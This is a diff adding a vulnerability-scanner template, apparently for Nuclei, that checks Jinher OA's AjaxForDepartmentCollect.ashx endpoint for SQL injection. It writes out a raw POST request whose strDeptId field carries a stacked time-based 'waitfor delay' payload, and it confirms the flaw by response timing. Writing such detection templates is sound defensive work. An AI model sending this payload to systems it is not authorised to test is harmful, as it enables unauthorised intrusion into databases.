@@ -1,0 +1,39 @@
+id: poc-yaml-jinher-jhsoft-ajaxfordepartmentcollect-aspx-sqli
+info:
+  name: Jinher OA AjaxForDepartmentCollect.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Jinher OA AjaxForDepartmentCollect.ashx is vulnerable to an SQL Injection attack.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getHistoryList&strDeptId=1;waitfor+delay%270:0:{{t1}}%27--&strCollectType=Department&strYear=2012
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "没有汇总记录"
+        part: body
+      - type: word
+        words:
+          - "<html"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t1)'
+          - 'duration <= to_number(t2)'
